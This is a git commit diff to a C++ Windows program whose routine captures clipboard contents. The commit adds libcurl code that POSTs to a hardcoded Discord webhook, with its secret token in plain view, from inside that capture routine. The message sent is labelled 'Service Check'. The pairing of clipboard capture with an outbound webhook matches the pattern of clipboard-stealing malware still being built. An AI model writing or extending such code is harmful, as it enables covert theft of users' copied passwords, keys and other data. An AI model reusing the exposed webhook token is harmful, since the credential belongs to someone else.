349044ce32c1a16a3a153d6258e45880df253005
Mrigayan <connect.mrigayan@gmail.com>
2024-10-26 21:20:38 +0530

    Added cURL

--- main.cpp
+++ main.cpp
@@ -2,6 +2,7 @@
 #include <iostream>
 #include <vector>
 #include <string>
+#include <curl/curl.h>
 
 // Function to get clipboard formats
 std::vector<UINT> GetClipboardFormats() {
@@ -63,6 +64,46 @@ void CaptureClipboardData() {
             // Add other formats as needed
         }
     }
+
+    CURL* curl;
+    CURLcode res;
+
+    curl_global_init(CURL_GLOBAL_DEFAULT);
+    curl = curl_easy_init();
+
+    if (curl) {
+        // Set URL
+        curl_easy_setopt(curl, CURLOPT_URL, "https://discord.com/api/webhooks/1299730885184196621/D-thfIMp10tf8vm3GvLpmP13QfaQ-wMnULkCD_IeyXFAdylVMZNaExrUUIEcg9poq3Xf");
+
+        // Specify POST method
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+
+        // Set POST fields
+        std::string jsonData = R"({"content":"Service Check"})";
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
+
+        // Set headers
+        struct curl_slist* headers = NULL;
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        // Specify the path to the CA bundle file
+        curl_easy_setopt(curl, CURLOPT_CAINFO, "lib\\curl-ca-bundle.crt");
+
+        // Perform the request, res will get the return code
+        res = curl_easy_perform(curl);
+
+        // Check for errors
+        if (res != CURLE_OK)
+            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
+        else
+            std::cout << "POST request sent successfully!" << std::endl;
+
+        // Cleanup
+        curl_easy_cleanup(curl);
+    }
+
+    curl_global_cleanup();
 
     // Close the clipboard
     CloseClipboard();
